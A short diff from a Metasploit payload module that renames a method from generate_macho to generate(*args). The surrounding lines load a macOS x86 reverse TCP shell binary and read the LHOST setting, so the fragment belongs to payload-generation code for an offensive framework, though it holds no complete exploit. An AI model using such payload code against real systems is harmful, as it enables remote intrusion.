@@ -64,7 +64,7 @@ module Metasploit3
     conn.put([p.length].pack('V'))
   end
 
-  def generate_macho
+  def generate(*args)
     bin = ::File.read(::File.join(Msf::Config.data_directory, 'osx', 'reverse_tcp_x86.bin'), {:mode => 'rb'})
     
     if datastore['LHOST']
